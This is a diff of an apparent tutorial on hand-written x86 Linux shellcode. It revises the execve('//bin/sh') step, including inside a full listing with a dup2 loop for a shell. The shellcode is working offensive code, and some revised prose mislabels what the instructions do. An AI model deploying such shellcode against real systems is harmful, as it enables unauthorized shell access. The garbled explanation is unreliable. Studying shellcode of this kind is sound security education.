@@ -434,18 +434,12 @@ The EBX register will be used to carry the pointer location of the '//bin/sh' en
 ```nasm
 	mov ebx, esp	; move pointer to '//bin/sh' into ebx, null terminated
 ```
-Null out the EAX register by pushing the value of '0' onto the stack, then move the pointer to '//bin/sh' from EAX into EDX (Null terminated):
+
+Null out the EAX register by clearing the ECX and EDX registers:
 
 ```nasm
-	push eax        ; terminator placed onto the stack with value of 0
-        mov edx, eax    ; move pointer to '//bin/sh' into edx, null terminated
-```
-
-ECX should point to the location of EBX, push EBX onto the stack and then move ESP into ECX:
-
-```nasm
-	push ebx        ; push 0 onto the stack
-        mov ecx, esp    ; move pointer to '//bin/sh' into ecx, null terminated
+	xor ecx, ecx    ; clear ecx register
+        xor edx, edx    ; clear edx register
 ```
 
 The execve syscall code can be found in the header file below, converting 11 from decimal to hex equals 0xb:
@@ -468,16 +462,15 @@ Finally, the execve syscall and the program interrupt are called to execute the 
 
 ```nasm
 	; 4th syscall - execute /bin/sh using execve
-        xor eax, eax	; clear eax register
-	push eax        ; terminator placed onto the stack with value of 0
+        xor eax, eax    ; clear eax register
+        push eax        ; terminator placed onto the stack with value of 0
         push 0x68732f6e ; push the end of "//bin/sh", 'hs/n'
         push 0x69622f2f ; push the beginning of "//bin/sh", 'ib//'
+        mov byte [esp + 11], al
         mov ebx, esp    ; move pointer to '//bin/sh' into ebx, null terminated
-        push eax        ; terminator placed onto the stack with value of 0
-        mov edx, eax    ; move pointer to '//bin/sh' into edx, null terminated
-        push ebx        ; push 0 onto the stack
-        mov ecx, esp    ; move pointer to '//bin/sh' into ecx, null terminated
-	mov al, 0xb     ; move syscall code for execve into al
+        mov al, 0xb     ; move syscall code for execve into al
+        xor ecx, ecx    ; clear ecx register
+        xor edx, edx    ; clear edx register
         int 0x80        ; call the interrupt to execute execve syscall, execute '//bin/sh' shell
 ```
 
@@ -542,16 +535,15 @@ section .text
         jns loop_dup2   ; repeat for 1,0
 
         ; 4th syscall - execute /bin/sh using execve
-        xor eax, eax	; clear eax register
-	push eax        ; terminator placed onto the stack with value of 0
+        xor eax, eax    ; clear eax register
+        push eax        ; terminator placed onto the stack with value of 0
         push 0x68732f6e ; push the end of "//bin/sh", 'hs/n'
         push 0x69622f2f ; push the beginning of "//bin/sh", 'ib//'
+        mov byte [esp + 11], al
         mov ebx, esp    ; move pointer to '//bin/sh' into ebx, null terminated
-        push eax        ; terminator placed onto the stack with value of 0
-        mov edx, eax    ; move pointer to '//bin/sh' into edx, null terminated
-        push ebx        ; push 0 onto the stack
-        mov ecx, esp    ; move pointer to '//bin/sh' into ecx, null terminated
-	mov al, 0xb     ; move syscall code for execve into al
+        mov al, 0xb     ; move syscall code for execve into al
+        xor ecx, ecx    ; clear ecx register
+        xor edx, edx    ; clear edx register
         int 0x80        ; call the interrupt to execute execve syscall, execute '//bin/sh' shell
 ````
 
